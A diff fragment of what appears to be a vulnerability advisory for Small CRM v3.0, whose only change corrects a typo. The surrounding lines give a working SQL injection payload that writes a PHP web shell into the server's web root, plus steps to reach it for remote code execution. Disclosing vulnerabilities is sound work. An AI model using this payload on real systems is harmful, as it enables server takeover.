@@ -15,7 +15,7 @@ The Registration page on Small CRM v3.0 is vulnerable to SQL injection, allowing
    - ```sql '+AND+1337=1337+union+all+select+"<?php+echo+shell_exec($_GET['cmd']);?>"INTO+OUTFILE+'C:\\xampp\\htdocs\\webshell.php'#```
    - ![Payload Execution](sqli_payload.png)
 9. Modify the payload to access the webshell on the server and utilize it to gain complete access to the web server.
-10. Access the URL associated with the generated file, triggering a Remote Code Exeuction.
+10. Access the URL associated with the generated file, triggering a Remote Code Execution.
     - ![RCE](rce.png)
 
 ### Payload for SQLI
